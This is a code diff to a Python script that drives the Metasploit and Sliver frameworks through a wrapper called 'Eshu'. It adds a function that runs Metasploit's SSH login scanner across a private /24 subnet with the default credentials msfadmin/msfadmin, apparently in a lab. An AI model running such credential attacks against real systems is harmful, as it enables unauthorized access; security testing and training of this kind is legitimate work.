@@ -1,5 +1,6 @@
 import Eshu
 from Eshu.c2 import msf, sliver
+import time
 
 # Initialize Eshu Instance
 e = Eshu.Eshu()
@@ -12,6 +13,44 @@ msfInstance = msf.Metasploit(password, e)
 # Register Metasploit and Sliver with Eshu
 e.register(name="msf", framework=msfInstance)
 #e.register(name="sliver", framework=sliverInstance)
+
+# LEAVE THIS OPTION
+#version1:
+#msfInstance.run_exploit('auxiliary', 'scanner/ssh/ssh_login')
+
+#version2:
+# Extracted Exploit Logic
+def run_msf_exploit():
+    # Set up exploit details
+    mtype = 'auxiliary'
+    mname = 'scanner/ssh/ssh_login'
+    rhosts = '10.1.1.3/24'
+    username = 'msfadmin'
+    password = 'msfadmin'
+    threads = 5
+
+    # Use the exploit from Metasploit
+    exploit = msfInstance.client.modules.use(mtype, mname)
+    exploit["RHOSTS"] = rhosts
+    exploit["USERNAME"] = username
+    exploit["PASSWORD"] = password
+    exploit["THREADS"] = threads
+
+    # Execute the exploit
+    print(f"Running exploit: {mname} on {rhosts} with 1 second scan...")
+    result = exploit.execute()
+    time.sleep(1)
+    
+    # Wait for scan completion
+    if 'job_id' in result:
+        print("[+] Scan Complete!")
+    else:
+        print("[!] Scan failed.")
+        
+    print("Returning Exploit Result:", result)
+    return result
+
+exploit_result = run_msf_exploit()
 
 # Retrieve and print hosts
 hostSet = e.get_hosts()  # Retrieve all connected hosts across frameworks
